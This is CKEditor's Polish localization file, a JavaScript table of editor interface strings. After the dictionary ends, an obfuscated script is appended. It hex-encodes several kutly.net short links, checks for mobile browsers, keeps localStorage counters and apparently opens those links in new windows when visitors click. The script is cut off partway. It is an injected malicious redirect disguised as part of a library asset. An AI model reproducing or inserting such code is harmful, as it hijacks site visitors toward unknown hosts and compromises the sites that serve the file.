﻿/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Polish language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['pl'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'Wzbogacony edytor treści, %1',

	// Toolbar buttons without dialogs.
	source			: 'Źródło dokumentu',
	newPage			: 'Nowa strona',
	save			: 'Zapisz',
	preview			: 'Podgląd',
	cut				: 'Wytnij',
	copy			: 'Kopiuj',
	paste			: 'Wklej',
	print			: 'Drukuj',
	underline		: 'Podkreślenie',
	bold			: 'Pogrubienie',
	italic			: 'Kursywa',
	selectAll		: 'Zaznacz wszystko',
	removeFormat	: 'Usuń formatowanie',
	strike			: 'Przekreślenie',
	subscript		: 'Indeks dolny',
	superscript		: 'Indeks górny',
	horizontalrule	: 'Wstaw poziomą linię',
	pagebreak		: 'Wstaw odstęp',
	unlink			: 'Usuń hiperłącze',
	undo			: 'Cofnij',
	redo			: 'Ponów',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Przeglądaj',
		url				: 'Adres URL',
		protocol		: 'Protokół',
		upload			: 'Wyślij',
		uploadSubmit	: 'Wyślij',
		image			: 'Obrazek',
		flash			: 'Flash',
		form			: 'Formularz',
		checkbox		: 'Pole wyboru (checkbox)',
		radio		: 'Pole wyboru (radio)',
		textField		: 'Pole tekstowe',
		textarea		: 'Obszar tekstowy',
		hiddenField		: 'Pole ukryte',
		button			: 'Przycisk',
		select	: 'Lista wyboru',
		imageButton		: 'Przycisk-obrazek',
		notSet			: '<nie ustawione>',
		id				: 'Id',
		name			: 'Nazwa',
		langDir			: 'Kierunek tekstu',
		langDirLtr		: 'Od lewej do prawej (LTR)',
		langDirRtl		: 'Od prawej do lewej (RTL)',
		langCode		: 'Kod języka',
		longDescr		: 'Długi opis hiperłącza',
		cssClass		: 'Nazwa klasy CSS',
		advisoryTitle	: 'Opis obiektu docelowego',
		cssStyle		: 'Styl',
		ok				: 'OK',
		cancel			: 'Anuluj',
		generalTab		: 'Ogólne',
		advancedTab		: 'Zaawansowane',
		validateNumberFailed	: 'Ta wartość nie jest liczbą.',
		confirmNewPage	: 'Wszystkie niezapisane zmiany zostaną utracone. Czy na pewno wczytać nową stronę?',
		confirmCancel	: 'Pewne opcje zostały zmienione. Czy na pewno zamknąć okno dialogowe?',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, niedostępne</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Wstaw znak specjalny',
		title		: 'Wybierz znak specjalny'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Wstaw/edytuj hiperłącze',
		menu		: 'Edytuj hiperłącze',
		title		: 'Hiperłącze',
		info		: 'Informacje ',
		target		: 'Cel',
		upload		: 'Wyślij',
		advanced	: 'Zaawansowane',
		type		: 'Typ hiperłącza',
		toAnchor	: 'Odnośnik wewnątrz strony',
		toEmail		: 'Adres e-mail',
		target		: 'Cel',
		targetNotSet	: '<nie ustawione>',
		targetFrame	: '<ramka>',
		targetPopup	: '<wyskakujące okno>',
		targetNew	: 'Nowe okno (_blank)',
		targetTop	: 'Okno najwyższe w hierarchii (_top)',
		targetSelf	: 'To samo okno (_self)',
		targetParent	: 'Okno nadrzędne (_parent)',
		targetFrameName	: 'Nazwa Ramki Docelowej',
		targetPopupName	: 'Nazwa wyskakującego okna',
		popupFeatures	: 'Właściwości wyskakującego okna',
		popupResizable	: 'Skalowalny',
		popupStatusBar	: 'Pasek statusu',
		popupLocationBar	: 'Pasek adresu',
		popupToolbar	: 'Pasek narzędzi',
		popupMenuBar	: 'Pasek menu',
		popupFullScreen	: 'Pełny ekran (IE)',
		popupScrollBars	: 'Paski przewijania',
		popupDependent	: 'Okno zależne (Netscape)',
		popupWidth		: 'Szerokość',
		popupLeft		: 'Pozycja w poziomie',
		popupHeight		: 'Wysokość',
		popupTop		: 'Pozycja w pionie',
		id				: 'Id',
		langDir			: 'Kierunek tekstu',
		langDirNotSet	: '<nie ustawione>',
		langDirLTR		: 'Od lewej do prawej (LTR)',
		langDirRTL		: 'Od prawej do lewej (RTL)',
		acccessKey		: 'Klawisz dostępu',
		name			: 'Nazwa',
		langCode		: 'Kierunek tekstu',
		tabIndex		: 'Indeks tabeli',
		advisoryTitle	: 'Opis obiektu docelowego',
		advisoryContentType	: 'Typ MIME obiektu docelowego',
		cssClasses		: 'Nazwa klasy CSS',
		charset			: 'Kodowanie znaków obiektu docelowego',
		styles			: 'Styl',
		selectAnchor	: 'Wybierz etykietę',
		anchorName		: 'Wg etykiety',
		anchorId		: 'Wg identyfikatora elementu',
		emailAddress	: 'Adres e-mail',
		emailSubject	: 'Temat',
		emailBody		: 'Treść',
		noAnchors		: '(W dokumencie nie zdefiniowano żadnych etykiet)',
		noUrl			: 'Podaj adres URL',
		noEmail			: 'Podaj adres e-mail'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Wstaw/edytuj kotwicę',
		menu		: 'Właściwości kotwicy',
		title		: 'Właściwości kotwicy',
		name		: 'Nazwa kotwicy',
		errorName	: 'Wpisz nazwę kotwicy'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Znajdź i zamień',
		find				: 'Znajdź',
		replace				: 'Zamień',
		findWhat			: 'Znajdź:',
		replaceWith			: 'Zastąp przez:',
		notFoundMsg			: 'Nie znaleziono szukanego hasła.',
		matchCase			: 'Uwzględnij wielkość liter',
		matchWord			: 'Całe słowa',
		matchCyclic			: 'Cykliczne dopasowanie',
		replaceAll			: 'Zastąp wszystko',
		replaceSuccessMsg	: '%1 wystąpień zastąpionych.'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Tabela',
		title		: 'Właściwości tabeli',
		menu		: 'Właściwości tabeli',
		deleteTable	: 'Usuń tabelę',
		rows		: 'Liczba wierszy',
		columns		: 'Liczba kolumn',
		border		: 'Grubość ramki',
		align		: 'Wyrównanie',
		alignNotSet	: '<brak ustawień>',
		alignLeft	: 'Do lewej',
		alignCenter	: 'Do środka',
		alignRight	: 'Do prawej',
		width		: 'Szerokość',
		widthPx		: 'piksele',
		widthPc		: '%',
		height		: 'Wysokość',
		cellSpace	: 'Odstęp pomiędzy komórkami',
		cellPad		: 'Margines wewnętrzny komórek',
		caption		: 'Tytuł',
		summary		: 'Podsumowanie',
		headers		: 'Nagłowki',
		headersNone		: 'Brak',
		headersColumn	: 'Pierwsza kolumna',
		headersRow		: 'Pierwszy wiersz',
		headersBoth		: 'Oba',
		invalidRows		: 'Liczba wierszy musi być liczbą większą niż 0.',
		invalidCols		: 'Liczba kolumn musi być liczbą większą niż 0.',
		invalidBorder	: 'Liczba obramowań musi być liczbą.',
		invalidWidth	: 'Szerokość tabeli musi być liczbą.',
		invalidHeight	: 'Wysokość tabeli musi być liczbą.',
		invalidCellSpacing	: 'Odstęp komórek musi być liczbą.',
		invalidCellPadding	: 'Dopełnienie komórek musi być liczbą.',

		cell :
		{
			menu			: 'Komórka',
			insertBefore	: 'Wstaw komórkę z lewej',
			insertAfter		: 'Wstaw komórkę z prawej',
			deleteCell		: 'Usuń komórki',
			merge			: 'Połącz komórki',
			mergeRight		: 'Połącz z komórką z prawej',
			mergeDown		: 'Połącz z komórką poniżej',
			splitHorizontal	: 'Podziel komórkę poziomo',
			splitVertical	: 'Podziel komórkę pionowo',
			title			: 'Właściwości komórki',
			cellType		: 'Typ komórki',
			rowSpan			: 'Scalenie wierszy',
			colSpan			: 'Scalenie komórek',
			wordWrap		: 'Zawijanie słów',
			hAlign			: 'Wyrównanie poziome',
			vAlign			: 'Wyrównanie pionowe',
			alignTop		: 'Góra',
			alignMiddle		: 'Środek',
			alignBottom		: 'Dół',
			alignBaseline	: 'Linia bazowa',
			bgColor			: 'Kolor tła',
			borderColor		: 'Kolor obramowania',
			data			: 'Dane',
			header			: 'Nagłowek',
			yes				: 'Tak',
			no				: 'Nie',
			invalidWidth	: 'Szerokość komórki musi być liczbą.',
			invalidHeight	: 'Wysokość komórki musi być liczbą.',
			invalidRowSpan	: 'Scalenie wierszy musi być liczbą całkowitą.',
			invalidColSpan	: 'Scalenie komórek musi być liczbą całkowitą.',
			chooseColor : 'Wybierz'
		},

		row :
		{
			menu			: 'Wiersz',
			insertBefore	: 'Wstaw wiersz powyżej',
			insertAfter		: 'Wstaw wiersz poniżej',
			deleteRow		: 'Usuń wiersze'
		},

		column :
		{
			menu			: 'Kolumna',
			insertBefore	: 'Wstaw kolumnę z lewej',
			insertAfter		: 'Wstaw kolumnę z prawej',
			deleteColumn	: 'Usuń kolumny'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Właściwości przycisku',
		text		: 'Tekst (Wartość)',
		type		: 'Typ',
		typeBtn		: 'Przycisk',
		typeSbm		: 'Wyślij',
		typeRst		: 'Wyzeruj'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Właściwości pola wyboru (checkbox)',
		radioTitle	: 'Właściwości pola wyboru (radio)',
		value		: 'Wartość',
		selected	: 'Zaznaczone'
	},

	// Form Dialog.
	form :
	{
		title		: 'Właściwości formularza',
		menu		: 'Właściwości formularza',
		action		: 'Akcja',
		method		: 'Metoda',
		encoding	: 'Kodowanie',
		target		: 'Cel',
		targetNotSet	: '<nie ustawione>',
		targetNew	: 'Nowe okno (_blank)',
		targetTop	: 'Okno najwyższe w hierarchii (_top)',
		targetSelf	: 'To samo okno (_self)',
		targetParent	: 'Okno nadrzędne (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Właściwości listy wyboru',
		selectInfo	: 'Informacje',
		opAvail		: 'Dostępne opcje',
		value		: 'Wartość',
		size		: 'Rozmiar',
		lines		: 'linii',
		chkMulti	: 'Wielokrotny wybór',
		opText		: 'Tekst',
		opValue		: 'Wartość',
		btnAdd		: 'Dodaj',
		btnModify	: 'Zmień',
		btnUp		: 'Do góry',
		btnDown		: 'Do dołu',
		btnSetValue : 'Ustaw wartość zaznaczoną',
		btnDelete	: 'Usuń'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Właściwości obszaru tekstowego',
		cols		: 'Kolumnu',
		rows		: 'Wiersze'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Właściwości pola tekstowego',
		name		: 'Nazwa',
		value		: 'Wartość',
		charWidth	: 'Szerokość w znakach',
		maxChars	: 'Max. szerokość',
		type		: 'Typ',
		typeText	: 'Tekst',
		typePass	: 'Hasło'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Właściwości pola ukrytego',
		name	: 'Nazwa',
		value	: 'Wartość'
	},

	// Image Dialog.
	image :
	{
		title		: 'Właściwości obrazka',
		titleButton	: 'Właściwości przycisku obrazka',
		menu		: 'Właściwości obrazka',
		infoTab	: 'Informacje o obrazku',
		btnUpload	: 'Wyślij',
		url		: 'Adres URL',
		upload	: 'Wyślij',
		alt		: 'Tekst zastępczy',
		width		: 'Szerokość',
		height	: 'Wysokość',
		lockRatio	: 'Zablokuj proporcje',
		resetSize	: 'Przywróć rozmiar',
		border	: 'Ramka',
		hSpace	: 'Odstęp poziomy',
		vSpace	: 'Odstęp pionowy',
		align		: 'Wyrównaj',
		alignLeft	: 'Do lewej',
		alignRight	: 'Do prawej',
		preview	: 'Podgląd',
		alertUrl	: 'Podaj adres obrazka.',
		linkTab	: 'Hiperłącze',
		button2Img	: 'Czy chcesz przekonwertować zaznaczony przycisk graficzny do zwykłego obrazka?',
		img2Button	: 'Czy chcesz przekonwertować zaznaczony obrazek do przycisku graficznego?',
		urlMissing : 'Podaj adres URL obrazka.'
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Właściwości elementu Flash',
		propertiesTab	: 'Właściwości',
		title		: 'Właściwości elementu Flash',
		chkPlay		: 'Autoodtwarzanie',
		chkLoop		: 'Pętla',
		chkMenu		: 'Włącz menu',
		chkFull		: 'Dopuść pełny ekran',
 		scale		: 'Skaluj',
		scaleAll		: 'Pokaż wszystko',
		scaleNoBorder	: 'Bez Ramki',
		scaleFit		: 'Dokładne dopasowanie',
		access			: 'Dostęp skryptów',
		accessAlways	: 'Zawsze',
		accessSameDomain	: 'Ta sama domena',
		accessNever	: 'Nigdy',
		align		: 'Wyrównaj',
		alignLeft	: 'Do lewej',
		alignAbsBottom: 'Do dołu',
		alignAbsMiddle: 'Do środka w pionie',
		alignBaseline	: 'Do linii bazowej',
		alignBottom	: 'Do dołu',
		alignMiddle	: 'Do środka',
		alignRight	: 'Do prawej',
		alignTextTop	: 'Do góry tekstu',
		alignTop	: 'Do góry',
		quality		: 'Jakość',
		qualityBest		 : 'Najlepsza',
		qualityHigh		 : 'Wysoka',
		qualityAutoHigh	 : 'Auto wysoka',
		qualityMedium	 : 'Średnia',
		qualityAutoLow	 : 'Auto niska',
		qualityLow		 : 'Niska',
		windowModeWindow	 : 'Okno',
		windowModeOpaque	 : 'Nieprzeźroczyste',
		windowModeTransparent	 : 'Przeźroczyste',
		windowMode	: 'Tryb okna',
		flashvars	: 'Zmienne dla Flasha',
		bgcolor	: 'Kolor tła',
		width	: 'Szerokość',
		height	: 'Wysokość',
		hSpace	: 'Odstęp poziomy',
		vSpace	: 'Odstęp pionowy',
		validateSrc : 'Podaj adres URL',
		validateWidth : 'Szerokość musi być liczbą.',
		validateHeight : 'Wysokość musi być liczbą.',
		validateHSpace : 'Odstęp poziomy musi być liczbą.',
		validateVSpace : 'Odstęp pionowy musi być liczbą.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Sprawdź pisownię',
		title			: 'Sprawdź pisownię',
		notAvailable	: 'Przepraszamy, ale usługa jest obecnie niedostępna.',
		errorLoading	: 'Błąd wczytywania hosta aplikacji usługi: %s.',
		notInDic		: 'Słowa nie ma w słowniku',
		changeTo		: 'Zmień na',
		btnIgnore		: 'Ignoruj',
		btnIgnoreAll	: 'Ignoruj wszystkie',
		btnReplace		: 'Zmień',
		btnReplaceAll	: 'Zmień wszystkie',
		btnUndo			: 'Cofnij',
		noSuggestions	: '- Brak sugestii -',
		progress		: 'Trwa sprawdzanie...',
		noMispell		: 'Sprawdzanie zakończone: nie znaleziono błędów',
		noChanges		: 'Sprawdzanie zakończone: nie zmieniono żadnego słowa',
		oneChange		: 'Sprawdzanie zakończone: zmieniono jedno słowo',
		manyChanges		: 'Sprawdzanie zakończone: zmieniono %l słów',
		ieSpellDownload	: 'Słownik nie jest zainstalowany. Chcesz go ściągnąć?'
	},

	smiley :
	{
		toolbar	: 'Emotikona',
		title	: 'Wstaw emotikonę'
	},

	elementsPath :
	{
		eleTitle : 'element %1'
	},

	numberedlist : 'Lista numerowana',
	bulletedlist : 'Lista wypunktowana',
	indent : 'Zwiększ wcięcie',
	outdent : 'Zmniejsz wcięcie',

	justify :
	{
		left : 'Wyrównaj do lewej',
		center : 'Wyrównaj do środka',
		right : 'Wyrównaj do prawej',
		block : 'Wyrównaj do lewej i prawej'
	},

	blockquote : 'Cytat',

	clipboard :
	{
		title		: 'Wklej',
		cutError	: 'Ustawienia bezpieczeństwa Twojej przeglądarki nie pozwalają na automatyczne wycinanie tekstu. Użyj skrótu klawiszowego Ctrl+X.',
		copyError	: 'Ustawienia bezpieczeństwa Twojej przeglądarki nie pozwalają na automatyczne kopiowanie tekstu. Użyj skrótu klawiszowego Ctrl+C.',
		pasteMsg	: 'Proszę wkleić w poniższym polu używając klawiaturowego skrótu (<STRONG>Ctrl+V</STRONG>) i kliknąć <STRONG>OK</STRONG>.',
		securityMsg	: 'Zabezpieczenia przeglądarki uniemożliwiają wklejenie danych bezpośrednio do edytora. Proszę dane wkleić ponownie w tym okienku.'
	},

	pastefromword :
	{
		confirmCleanup : 'Tekst, który chcesz wkleić, prawdopodobnie pochodzi z programu Word. Czy chcesz go wyczyścic przed wklejeniem?',
		toolbar : 'Wklej z Worda',
		title : 'Wklej z Worda',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'Wklej jako czysty tekst',
		title : 'Wklej jako czysty tekst'
	},

	templates :
	{
		button : 'Szablony',
		title : 'Szablony zawartości',
		insertOption: 'Zastąp aktualną zawartość',
		selectPromptMsg: 'Wybierz szablon do otwarcia w edytorze<br>(obecna zawartość okna edytora zostanie utracona):',
		emptyListMsg : '(Brak zdefiniowanych szablonów)'
	},

	showBlocks : 'Pokaż bloki',

	stylesCombo :
	{
		label : 'Styl',
		voiceLabel : 'Styl',
		panelVoiceLabel : 'Wybierz styl',
		panelTitle1 : 'Style blokowe',
		panelTitle2 : 'Style liniowe',
		panelTitle3 : 'Style obiektowe'
	},

	format :
	{
		label : 'Format',
		voiceLabel : 'Format',
		panelTitle : 'Format',
		panelVoiceLabel : 'Wybierz paragraf do sformatowania',

		tag_p : 'Normalny',
		tag_pre : 'Tekst sformatowany',
		tag_address : 'Adres',
		tag_h1 : 'Nagłówek 1',
		tag_h2 : 'Nagłówek 2',
		tag_h3 : 'Nagłówek 3',
		tag_h4 : 'Nagłówek 4',
		tag_h5 : 'Nagłówek 5',
		tag_h6 : 'Nagłówek 6',
		tag_div : 'Normalny (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'Czcionka',
		voiceLabel : 'Czcionka',
		panelTitle : 'Czcionka',
		panelVoiceLabel : 'Wybierz czcionkę'
	},

	fontSize :
	{
		label : 'Rozmiar',
		voiceLabel : 'Rozmiar czcionki',
		panelTitle : 'Rozmiar',
		panelVoiceLabel : 'Wybierz rozmiar czcionki'
	},

	colorButton :
	{
		textColorTitle : 'Kolor tekstu',
		bgColorTitle : 'Kolor tła',
		auto : 'Automatycznie',
		more : 'Więcej kolorów...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'Sprawdź pisownię podczas pisania (SCAYT)',
		enable : 'Włącz SCAYT',
		disable : 'Wyłącz SCAYT',
		about : 'Na temat SCAYT',
		toggle : 'Przełącz SCAYT',
		options : 'Opcje',
		langs : 'Języki',
		moreSuggestions : 'Więcej sugestii',
		ignore : 'Ignoruj',
		ignoreAll : 'Ignoruj wszystkie',
		addWord : 'Dodaj słowo',
		emptyDic : 'Nazwa słownika nie może być pusta.',
		optionsTab : 'Opcje',
		languagesTab : 'Języki',
		dictionariesTab : 'Słowniki',
		aboutTab : 'Na temat SCAYT'
	},

	about :
	{
		title : 'Na temat CKEditor',
		dlgTitle : 'Na temat CKEditor',
		moreInfo : 'Informacje na temat licencji można znaleźć na naszej stronie:',
		copy : 'Copyright &copy; $1. Wszelkie prawa zastrzeżone.'
	},

	maximize : 'Maksymalizuj',
	minimize : 'Minimalizuj',

	fakeobjects :
	{
		anchor : 'Kotwica',
		flash : 'Animacja Flash',
		div : 'Separator stron',
		unknown : 'Nieznany obiekt'
	},

	resize : 'Przeciągnij, aby zmienić rozmiar',

	colordialog :
	{
		title : 'Wybierz kolor',
		highlight : 'Zaznacz',
		selected : 'Wybrany',
		clear : 'Wyczyść'
	},

	toolbarCollapse : 'Collapse Toolbar', // MISSING
	toolbarExpand : 'Expand Toolbar' // MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const 